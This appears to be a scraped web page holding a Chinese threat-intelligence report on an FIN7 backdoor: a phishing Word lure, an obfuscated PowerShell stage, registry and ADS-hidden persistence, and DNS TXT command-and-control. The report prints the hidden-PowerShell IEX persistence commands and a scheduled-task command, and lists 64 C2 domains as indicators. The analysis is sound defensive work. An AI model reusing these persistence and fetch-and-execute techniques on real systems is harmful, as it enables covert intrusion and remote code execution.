19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.hvzr.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.reld.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vqba.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.oxrp.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.dvso.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.bvyv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.bwuk.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.cihr.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.coec.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oyaw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pbbk.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ppdx.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pvze.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qefg.info</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qlpa.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ueox.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ufyb.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.dbxa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eady.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.enuv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eter.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.utca.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vdfe.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vjro.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fbjz.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fhyi.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.futh.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.gnoa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vwcq.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jimw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jomp.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jxhv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.kshv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ysxy.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zmyo.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zody.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lhlv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lnoy.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lvrm.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.mfka.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.nxpu.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oaax.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.odyr.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oknz.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooep.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ckwl.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/11 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n<tr>\n<td>www.zcnt.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/16 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="203">参考链接</h2>\n<p class="line" data-line="205"><a href="https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html">fireeye-fin7 spear phishing</a></p>\n',category:"专题报告",__v:1,abstract:"2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。",modify_time:"2017-07-26T12:03:20.346Z",readableId:"fin7-apt-campaign-backdoor-analysis",publish_time:"2017-06-19T09:00:13.000Z",insert_time:"2017-07-25T12:03:51.314Z",isDraft:!1,tags:["Fin7","APT","Backdoor"]}}],error:null,state:{pageId:[],tagParam:[],isMainPage:!1,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee3a",title:"FIN7 APT组织攻击木马分析报告",author:"admin",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&amp;C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>d04b6410dddee19adec75f597c52e386</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>1,834,496字节</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="12">攻击特点与攻击流程</h2>\n<p class="line" data-line="14">FIN7攻击特点主要体现在：</p>\n<ol>\n<li>全部攻击过程使用非PE实现，钓鱼使用doc文件，后门使用powershell文件。</li>\n<li>使用ADS数据隐藏保存在磁盘中的非PE文件</li>\n<li>后门文件保存在注册表中，功能由Powershell实现</li>\n<li>与C&amp;C通信使用DNS协议的TXT记录</li>\n<li>C&amp;C地址从64个硬编码的地址中随机选择</li>\n</ol>\n<p class="line" data-line="22">攻击流程：</p>\n<p class="line" data-line="24">在整个攻击过程中，没有使用到PE文件，这在一定程度上躲避了安全软件的查杀。落地的文件也进行了技术上的隐藏，而真正的后门程序却已加密的方式存储在注册表中。</p>\n<p class="line" data-line="26">攻击者以钓鱼邮件为进入渠道，在恶意文档中嵌入vbs脚本，vbs脚本运行后解密后门程序写入注册表中，同时将调用后门程序的脚本以ads隐藏在磁盘文件中。在后门运行后，使用DNS TXT做为C&amp;C通信方式。</p>\n<p class="text-center line" data-line="28"><img src="/uploads/2017/07/25/82355e36b499e5621c500a61ecb5b32e.png" alt="" width="90%"></p>\n<h2 class="line" data-line="30">样本分析</h2>\n<p class="line" data-line="32">钓鱼邮件打开后，显示如下图所示，可以看到，文档中插入了一张图片，图片字体显示模糊。</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/25/3dc3540f45b7f96562007d8f96e3c72a.png" alt="" height="300"></p>\n<p class="line" data-line="36">通过分析，得到了钓鱼文档的制作过程：分别插入了一个vbs的OLE对象与一张字迹模糊的图片，将OLE对象的图标设置为透明图标并置入图片对象的顶层，最将两个对象组合到一起，这样就达到了双击图片，实际上运行了vbs脚本的目的。</p>\n<p class="line" data-line="38">双击图片，就会打开vbs脚本，只有当用户点击弹出的对话框中的确定后，才会运行vbs脚本，如果在这时，用户点击了取消，就可以阻断这次攻击。</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/25/ca530c4b9b5a6a179063bdbf5827c334.png" alt=""></p>\n<p class="line" data-line="42">为了诱导用户双击图片运行vbs脚本，文档中还写入“This document is protected by Microsoft Office and requires human verification Please Enable Editing and Double Click on page below.”（文档被Microsoft Office 保护，请启用编辑并双击下面的图片）。</p>\n<h3 class="line" data-line="44">VBS功能：</h3>\n<p class="line" data-line="46">当上面的图片被双击运行后，程序后台会运行VBS脚本，该脚本功能为：调用powershell解密一大段字符，从代码中可以看出，解密出来的为一gz文件，因此可以将这大段base64解密后，保存成gz格式，使用解压工具得到压缩文件继续分析。</p>\n<p class="text-center line" data-line="48"><img src="/uploads/2017/07/25/efe5911f07c641ea18e8dcd8bc7aa2d8.png" alt="" width="90%"></p>\n<h3 class="line" data-line="50">样本加载感染过程：</h3>\n<p class="line" data-line="52">gz中的文件也是一个powershell脚本。脚本经过混淆，实现的功能是：判断当前用户是不是administartor权限，根据不同的权限写入不同的注册表内容，这些内容为开机后会解密执行的代码，随后通过ADS将加载注册表内容的vbs脚本写入C:\\ProgramData\\windows:CtxDnsClient.vbs文件中，并将该文件加入启动项和计划任务中。</p>\n<p class="line" data-line="56">原始的powershell内容，可以看到powershell脚本经过了混淆：</p>\n<p class="text-center line" data-line="58"><img src="/uploads/2017/07/25/1bf4746c480aee7d805b5ab2e16e9260.png" alt="" width="90%"></p>\n<h4 class="line" data-line="60">后门程序写入注册表</h4>\n<p class="line" data-line="62">Powershell写入到注册表中的后门程序的内容如下：</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/4ee8cfbe553b6af66bb4785af970ce5c.png" alt="" width="90%"></p>\n<h4 class="line" data-line="66">ADS隐藏磁盘文件</h4>\n<p class="line" data-line="68">将要实现开机启动的文件写入到磁盘文件C:\\ProgramData\\Windows:CtxDnsClient.vbs中。</p>\n<p class="line" data-line="70">对于Windows:CtxDnsClient.vbs文件，使用了ADS数据隐藏技术。而通过ADS隐藏的数据在Windows系统中无法显示，文件大小也显示为0字节：</p>\n<p class="text-center line" data-line="72"><img src="/uploads/2017/07/25/5795bab47fcf1f01756b0f687073b372.png" alt=""></p>\n<p class="line" data-line="74">但是使用dir /r命令，可以看到ADS中有隐藏的数据</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/25/1b8f9439a9b5527869a722d745ddea26.png" alt=""></p>\n<p class="line" data-line="78">启动项中的隐藏的ads数据，dump出来后显示如下：</p>\n<p class="text-center line" data-line="80"><img src="/uploads/2017/07/25/e725019097179e8f215bbdee701809d7.png" alt="" width="90%"></p>\n<p class="line" data-line="82">使用 ADS中隐藏数据内容为：</p>\n<pre class="hljs"><code class="hljs">cmd /c "echo Set objShell = CreateObject(""Wscript.shell"") > C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n\ncmd /c "echo objShell.run ""powershell -WindowStyle Hidden -executionpolicy bypass -C IEX ((Get-ItemProperty -Path HKCU:Software\\\\Microsoft\\\\Windows).Part)"",0 >> C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n</code></pre>\n<h4 class="line" data-line="90">添加开机启动</h4>\n<p class="line" data-line="92">创建的启动项，启动项位置为HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\：</p>\n<p class="text-center line" data-line="94"><img src="/uploads/2017/07/25/56307f5b0fc04f4adff1ed5ebf3bdef1.png" alt="" width="90%"></p>\n<p class="line" data-line="96">添加计划任务：</p>\n<pre class="hljs"><code class="hljs">schtasks.exe /F /create /tn CtxDnsClient /tr "C:\\\\Windows\\\\System32\\\\wscript.exe C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs " /sc onidle /i 30\n</code></pre>\n<p class="line" data-line="102">通过上面这些过程，来实现程序的自启动。在系统重新启动后，启动项中的wscript.exe会加载Windows:CtxDnsClient.vbs，Windows:CtxDnsClient.vbs中会使用powershell加载HKCU\\Software\\Microsoft\\Windows\\Part内容，part中实现的功能会加载注册表相同位置下的CtxDnsClient的内容。这里的内容就是真正的实现CC的功能。</p>\n<h3 class="line" data-line="104">C&amp;C通信功能</h3>\n<p class="line" data-line="106">这部分功能主要在注册表中的HKCU\\Software\\Microsoft\\Windows下CtxDnsClient的内容中，主要功能为：从内置的64个域名中随机选择一个，查询该域名的SPF记录，用来实现自己的C&amp;C通信。</p>\n<p class="line" data-line="108">创建名为”SourceFireSux”的互斥体，防止程序重复运行：</p>\n<p class="text-center line" data-line="110"><img src="/uploads/2017/07/25/4431ee531ea5f531a4073e81e41f98eb.png" alt="" width="90%"></p>\n<p class="line" data-line="113">编码过的64个域名地址代码片段：</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/25/381eb523dccae6134a1175490710d43b.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="118"><img src="/uploads/2017/07/25/a74320966532d81dae8a9ab122eed550.png" alt="" width="90%"></p>\n<p class="line" data-line="121">从这64个域名中，随机选取一个（如这里随机被选择到的为：pbbk.us），加上www前缀，查询对应DNS TXT记录内容（即查询www.pbbk.us的dns txt记录）。</p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/dcf44e3c393ad1512846cdd2c268524a.png" alt="" width="90%"></p>\n<p class="line" data-line="126">如果返回的内容为idle，则程序睡眠3.5秒到5.4秒的随机时间。</p>\n<p class="line" data-line="128">如果返回的内容为www，则表明这个域名现在正在攻击者控制之中，随后查询mail.pbbk.us的dns txt记录。</p>\n<p class="line" data-line="130">随后mail.pbbk.us返回的内容就被 powershell直接通过IEX调用执行。</p>\n<h2 class="line" data-line="132">IOC</h2>\n<p class="line" data-line="134">木马尝试通信的C&amp;C地址：</p>\n<table>\n<thead>\n<tr>\n<th><strong>域名</strong></th>\n<th><strong>注册人</strong></th>\n<th><strong>注册时间</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>www.grij.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.kwoe.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zugh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.pafk.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cuuo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooyh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vxqt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cgqy.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wfsv.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.palj.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.idjb.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zjav.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.mewt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vkpo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wqiy.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wvzu.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.gxhp.top</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.hvzr.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.reld.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vqba.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.oxrp.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.dvso.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.bvyv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.bwuk.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.cihr.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.coec.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oyaw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pbbk.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ppdx.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pvze.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qefg.info</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qlpa.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ueox.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ufyb.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.dbxa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eady.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.enuv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eter.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.utca.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vdfe.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vjro.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fbjz.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fhyi.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.futh.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.gnoa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vwcq.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jimw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jomp.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jxhv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.kshv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ysxy.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zmyo.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zody.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lhlv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lnoy.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lvrm.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.mfka.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.nxpu.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oaax.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.odyr.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oknz.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooep.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ckwl.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/11 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n<tr>\n<td>www.zcnt.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/16 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="203">参考链接</h2>\n<p class="line" data-line="205"><a href="https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html">fireeye-fin7 spear phishing</a></p>\n',category:"专题报告",__v:1,abstract:"2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。",modify_time:"2017-07-26T12:03:20.346Z",readableId:"fin7-apt-campaign-backdoor-analysis",publish_time:"2017-06-19T09:00:13.000Z",insert_time:"2017-07-25T12:03:51.314Z",isDraft:!1,tags:["Fin7","APT","Backdoor"]}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.863edfce59f0a00ce608.js"></script><script defer src="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js"></script><script defer src="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js"></script>